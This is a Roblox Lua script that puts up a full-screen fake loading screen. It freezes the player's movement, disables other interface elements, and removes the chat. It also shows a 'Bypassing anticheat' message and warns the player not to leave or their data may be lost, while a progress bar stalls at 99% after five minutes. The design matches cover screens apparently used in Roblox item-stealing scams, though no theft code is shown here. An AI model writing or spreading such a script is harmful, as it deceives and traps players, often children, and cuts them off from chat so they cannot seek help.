local Players = game:GetService("Players")
local UIS = game:GetService("UserInputService")
local TextChatService = game:GetService("TextChatService")
local CoreGui = game:GetService("CoreGui")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Clear old loading GUIs
pcall(function() playerGui:FindFirstChild("FullCoverLoading"):Destroy() end)

-- Freeze movement
local function disableMovement()
	local char = player.Character or player.CharacterAdded:Wait()
	local humanoid = char:FindFirstChildOfClass("Humanoid")
	if humanoid then humanoid.WalkSpeed = 0 humanoid.JumpPower = 0 end
end
disableMovement()
player.CharacterAdded:Connect(disableMovement)

-- Disable existing UI
for _, gui in pairs(playerGui:GetChildren()) do
	if gui:IsA("ScreenGui") and gui.Name ~= "FullCoverLoading" then gui.Enabled = false end
end
playerGui.ChildAdded:Connect(function(c) if c:IsA("ScreenGui") and c.Name ~= "FullCoverLoading" then c.Enabled = false end end)

-- Disable chat
pcall(function()
	TextChatService.ChatWindowConfiguration.Enabled = false
	if CoreGui:FindFirstChild("Chat") then CoreGui.Chat:Destroy() end
end)
CoreGui.ChildAdded:Connect(function(c) if c.Name == "Chat" then c:Destroy() end end)

-- GUI base
local screen = Instance.new("ScreenGui", playerGui)
screen.Name = "FullCoverLoading"
screen.IgnoreGuiInset = true
screen.ZIndexBehavior = Enum.ZIndexBehavior.Global
screen.DisplayOrder = 1000

local bg = Instance.new("Frame", screen)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BorderSizePixel = 0

-- Add animated gray shapes
for i = 1, 15 do
	local shape = Instance.new("Frame", bg)
	shape.Size = UDim2.new(0, math.random(60, 120), 0, math.random(60, 120))
	shape.Position = UDim2.new(math.random(), 0, math.random(), 0)
	shape.BackgroundColor3 = Color3.fromRGB(math.random(50, 100), math.random(50, 100), math.random(50, 100))
	shape.BackgroundTransparency = 0.8
	shape.Rotation = math.random(0, 360)
	shape.BorderSizePixel = 0
	local corner = Instance.new("UICorner", shape)
	corner.CornerRadius = UDim.new(0, math.random(20, 60))

	-- Animate float
	task.spawn(function()
		while true do
			shape:TweenPosition(UDim2.new(math.random(), 0, math.random(), 0), "InOut", "Sine", 4, true)
			shape:TweenSize(UDim2.new(0, math.random(60, 120), 0, math.random(60, 120)), "InOut", "Sine", 4, true)
			task.wait(4)
		end
	end)
end

-- Main loading text
local loading = Instance.new("TextLabel", bg)
loading.Size = UDim2.new(1, 0, 0.1, 0)
loading.Position = UDim2.new(0, 0, 0.4, 0)
loading.BackgroundTransparency = 1
loading.TextColor3 = Color3.new(1, 1, 1)
loading.TextStrokeTransparency = 0.7
loading.Font = Enum.Font.GothamSemibold
loading.TextScaled = true
loading.Text = "Loading.. 0%"

-- Bypass text
local bypass = Instance.new("TextLabel", bg)
bypass.Size = UDim2.new(1, 0, 0.05, 0)
bypass.Position = UDim2.new(0, 0, 0.5, 0)
bypass.BackgroundTransparency = 1
bypass.Font = Enum.Font.Gotham
bypass.TextScaled = true
bypass.TextColor3 = Color3.fromRGB(170, 170, 170)
bypass.Text = "Bypassing anticheat..."

-- Warning
local warning = Instance.new("TextLabel", bg)
warning.Size = UDim2.new(1, 0, 0.05, 0)
warning.Position = UDim2.new(0, 0, 0.57, 0)
warning.BackgroundTransparency = 1
warning.Font = Enum.Font.Gotham
warning.TextScaled = true
warning.TextColor3 = Color3.fromRGB(255, 60, 60)
warning.Text = "⚠️ Do not leave, or your data may be lost."

-- Progress bar
local track = Instance.new("Frame", bg)
track.Size = UDim2.new(0.8, 0, 0.015, 0)
track.Position = UDim2.new(0.1, 0, 0.66, 0)
track.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
track.BackgroundTransparency = 0.3
track.BorderSizePixel = 0
Instance.new("UICorner", track).CornerRadius = UDim.new(0, 8)

local prog = Instance.new("Frame", track)
prog.Size = UDim2.new(0, 0, 1, 0)
prog.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
prog.BorderSizePixel = 0
Instance.new("UICorner", prog).CornerRadius = UDim.new(0, 8)

-- Animate loading (5 minutes = 300s, up to 99%)
task.spawn(function()
	for i = 1, 99 do
		loading.Text = "Loading.. " .. i .. "%"
		prog:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Quad", 0.1, true)
		task.wait(300 / 99)
	end
	loading.Text = "Loading.. 99%"
end)

-- Animate dots
task.spawn(function()
	local base = "Bypassing anticheat"
	while true do
		for i = 1, 3 do
			bypass.Text = base .. string.rep(".", i)
			task.wait(0.5)
		end
	end
end)

-- Freeze all input
UIS.InputBegan:Connect(function() return Enum.ContextActionResult.Sink end)
while true do task.wait(1) end
